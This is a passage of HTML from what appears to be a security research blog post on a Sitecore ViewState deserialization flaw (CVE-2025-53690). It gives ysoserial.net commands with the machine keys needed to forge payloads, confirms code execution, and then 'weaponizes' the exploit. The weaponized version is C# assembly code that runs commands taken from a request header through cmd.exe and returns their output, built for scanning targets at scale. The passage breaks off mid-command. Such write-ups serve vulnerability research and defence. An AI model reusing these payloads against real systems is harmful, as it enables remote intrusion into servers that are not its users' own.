&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &lt;span class="s2"&gt;&amp;#34;echo 123 &amp;gt; c:\windows\temp\test.txt&amp;#34;&lt;/span&gt; --path&lt;span class="o"&gt;=&lt;/span&gt;/sitecore/blocked.aspx --decryptionkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; --validationalg&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; --validationkey&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Send the payload; the response no longer contains &lt;code&gt;SerializationException&lt;/code&gt; â€” deserialization succeeded. Check for our file:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image33.png"
width="3176"
height="1665"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image33_hu_8bd27ffd7337c537.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image33_hu_541d3c86da52de04.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="190"
data-flex-basis="457px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image34.png"
width="946"
height="617"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image34_hu_8d6aee944dd66f8d.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image34_hu_92518807f193f21.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="153"
data-flex-basis="367px"
&gt;&lt;/p&gt;
&lt;p&gt;We achieved RCE :D&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="weaponize-the-poc"&gt;Weaponize the POC
&lt;/h2&gt;&lt;p&gt;However, there is a weakness when using this chain in practice. There will be cases where the target does not allow outbound connections, leaving us with no way to read the command&amp;rsquo;s output (e.g., DNS, reverse shell, etc.). The method of writing a webshell is also not feasible if the webroot is unknown â‡’ There is no way to confirm if our payload was successful. So, how can we write an exploitation/detection script to scan at scale?&lt;/p&gt;
&lt;h3 id="echo-technique"&gt;Echo technique
&lt;/h3&gt;&lt;p&gt;The solution here is the Echo technique. This technique works by accessing the request and response objects â‡’ then writing the command&amp;rsquo;s output into the response so it can be observed.&lt;/p&gt;
&lt;p&gt;There are several ways to achieve this, but the most optimal and simplest way in C# applications is to use a gadget chain that allows loading an arbitrary assembly. Therefore, we can embed our own custom-created assembly â‡’ executing arbitrary code. From there, we can call &lt;code&gt;System.Web.HttpContext.Current.Response&lt;/code&gt; to write the command output to the response.&lt;/p&gt;
&lt;p&gt;Among the gadget chains in &lt;a class="link" href="http://ysoserial.net/" target="_blank" rel="noopener"
&gt;ysoserial.net&lt;/a&gt;, the &lt;strong&gt;&lt;code&gt;ActivitySurrogateSelectorFromFile&lt;/code&gt;&lt;/strong&gt; gadget chain can be used for this purpose. This is a variant of the &lt;strong&gt;&lt;code&gt;ActivitySurrogateSelector&lt;/code&gt;&lt;/strong&gt; chain.&lt;/p&gt;
&lt;p&gt;A brief note on what makes this chain different: For traditional chains, we need to use &lt;strong&gt;&lt;code&gt;Serializable&lt;/code&gt;&lt;/strong&gt; objects in the chain. However, with this chain, we can deserialize almost anything :D. This opens the door for us to write output to the response via an object we create ourselves.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image35.png"
width="1356"
height="1245"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image35_hu_e9e5c5f94db45d1.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image35_hu_cc2a4046b18a5632.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="108"
data-flex-basis="261px"
&gt;&lt;/p&gt;
&lt;p&gt;You can learn more about this chain from the chain&amp;rsquo;s author&amp;rsquo;s blog here: &lt;a class="link" href="https://googleprojectzero.blogspot.com/2017/04/" target="_blank" rel="noopener"
&gt;https://googleprojectzero.blogspot.com/2017/04/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;However, the limitation of this chain is that it only works with .Net Framework versions &amp;lt; 4.8. This is because version 4.8+ implemented a checking mechanism for the &lt;code&gt;ActivitySurrogateSelector&lt;/code&gt; Type â‡’ preventing it from being triggered directly from the start.&lt;/p&gt;
&lt;p&gt;Still, this mechanism can be bypassed by using the &lt;code&gt;ActivitySurrogateDisableTypeCheck&lt;/code&gt; chain. Specifics about this chain can be read on the author&amp;rsquo;s blog here: &lt;a class="link" href="https://www.netspi.com/blog/technical-blog/adversary-simulation/re-animating-activitysurrogateselector/" target="_blank" rel="noopener"
&gt;https://www.netspi.com/blog/technical-blog/adversary-simulation/re-animating-activitysurrogateselector/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If we use this chain, we will have to send 2 requests (1 request to disable the type check, and 1 request to exploit the &lt;code&gt;ActivitySurrogateSelectorFromFile&lt;/code&gt; chain) â‡’ This is still not the most optimal chain in this case :D&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s look at other chains that also have the FromFile suffix in ysoserial.net. We have two chains: &lt;code&gt;DataSetOldBehaviourFromFile&lt;/code&gt; and &lt;code&gt;XamlAssemblyLoadFromFile&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Trying to generate a payload with the DataSetOldBehaviourFromFile chain, we see an error message:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image36.png"
width="2354"
height="297"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image36_hu_9853c9eb0f1e30e4.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image36_hu_da4c40b961a9abe3.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="792"
data-flex-basis="1902px"
&gt;&lt;/p&gt;
&lt;p&gt;The error is because the generated payload is too large, leading to an error during the string escaping process for the payload â‡’ this is definitely not optimal for the VIEWSTATE deserialize case :D&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try the &lt;code&gt;XamlAssemblyLoadFromFile&lt;/code&gt; chain. This chain originated from the author&amp;rsquo;s analysis of the &lt;code&gt;ActivitySurrogateDisableTypeCheck&lt;/code&gt; chain. The author observed that this disable-chain leverages the &lt;code&gt;TextFormattingRunProperties&lt;/code&gt; chain&amp;rsquo;s mechanism of running arbitrary code using XAML, and from there, uses Reflection to disable the type check mechanism. â‡’ If it can run code, it can certainly also load an arbitrary assembly using code â‡’ This led to the creation of this chain.&lt;/p&gt;
&lt;p&gt;Details can be found at: &lt;a class="link" href="https://russtone.io/2023/05/30/programming-with-xaml/" target="_blank" rel="noopener"
&gt;https://russtone.io/2023/05/30/programming-with-xaml/&lt;/a&gt; This is also a very good article and should be read to clearly understand the formation process of this chain :D&lt;/p&gt;
&lt;p&gt;Okay, no more talking, now run this command to generate the payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ysoserial&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="py"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;ViewState&lt;/span&gt; &lt;span class="n"&gt;-g&lt;/span&gt; &lt;span class="n"&gt;XamlAssemblyLoadFromFile&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;ExploitClass.cs;System.Web.dll;System.dll&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-path&lt;/span&gt;&lt;span class="p"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;blocked&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="py"&gt;aspx&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-decryptionkey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-validationalg&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-validationkey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;But first, we need to clearly understand how ysoserial works for chains with the FromFile suffix. For these chains, in the -c flag, instead of passing the command you want to execute, you will first pass the path to the exploit payload file, followed by the paths to the DLL files used in the payload.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image37.png"
width="1796"
height="571"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image37_hu_b305f20ba58ee3a9.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image37_hu_5d614a3d7c38d861.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="314"
data-flex-basis="754px"
&gt;&lt;/p&gt;
&lt;p&gt;This class is already available in the ExploitClass.cs file in the ysoserial.net directory with sample code. We just need to customize it to run the command and print the output. The default payload will be:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Forms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MessageBox&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Show&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Pwned&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;Pwned&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Forms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MessageBoxButtons&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;OK&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Windows&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Forms&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MessageBoxIcon&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This payload, when triggered, will pop up a MessageBox window with the content &amp;ldquo;Pwned&amp;rdquo;. However, since we are exploiting via an HTTP request and cannot see the MessageBox, we will comment out this line.&lt;/p&gt;
&lt;p&gt;In this case, for easier detection, we will first write an arbitrary value to the response header to identify it and end the response immediately to prevent the entire .NET pipeline afterward from overwriting the header during error generation. Uncomment the following two lines:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AddHeader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;X-YSOSERIAL-NET&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;HERE&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;End&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image38.png"
width="2606"
height="1518"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image38_hu_5200bd496913b27a.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image38_hu_127599e9becd8944.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="412px"
&gt;&lt;/p&gt;
&lt;p&gt;Since this payload uses &lt;code&gt;System.Web.HttpContext.Current.Response&lt;/code&gt;, we need to add the path to the System.Web.dll assembly in the -c parameter. These DLL files can be found in the .NET Framework directory on drive C (e.g., C:\Windows\Microsoft.NET\Framework64\v4.0.30319). For convenience and to shorten the command, we should copy these DLL files directly into the ysoserial.net directory. Then run the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ysoserial&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="py"&gt;exe&lt;/span&gt; &lt;span class="n"&gt;-p&lt;/span&gt; &lt;span class="n"&gt;ViewState&lt;/span&gt; &lt;span class="n"&gt;-g&lt;/span&gt; &lt;span class="n"&gt;XamlAssemblyLoadFromFile&lt;/span&gt; &lt;span class="n"&gt;-c&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;ExploitClass.cs;System.Web.dll&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-path&lt;/span&gt;&lt;span class="p"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;blocked&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="py"&gt;aspx&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-decryptionkey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-validationalg&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;-validationkey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;After sending the generated payload, we get the following response:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image39.png"
width="3164"
height="1746"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image39_hu_f7bfeba71e3e81a2.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image39_hu_dc81df0de9157c5a.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="181"
data-flex-basis="434px"
&gt;&lt;/p&gt;
&lt;p&gt;As we can see, the response no longer returns 500, and the header value we set has been returned in the response.&lt;/p&gt;
&lt;p&gt;So, with just one request, we can make the server execute arbitrary code. Now we just need to recode the payload to get the cmd value from the request (which can be in a parameter, header, etc.) and return the output in the response.&lt;/p&gt;
&lt;p&gt;We will code it as follows:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Diagnostics&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Diagnostics&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileName&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Arguments&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;/c &amp;#34;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UseShellExecute&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardError&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateNoWindow&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;End&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We will retrieve the cmd value from the request header, then run the command and return the output in the response body. Here, we additionally use &lt;code&gt;System.Diagnostics.Process&lt;/code&gt;, a class from the &lt;code&gt;System.dll&lt;/code&gt; assembly, so we need to copy this assembly into the ysoserial.net directory and add it to the &lt;code&gt;-c&lt;/code&gt; flag of the command.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
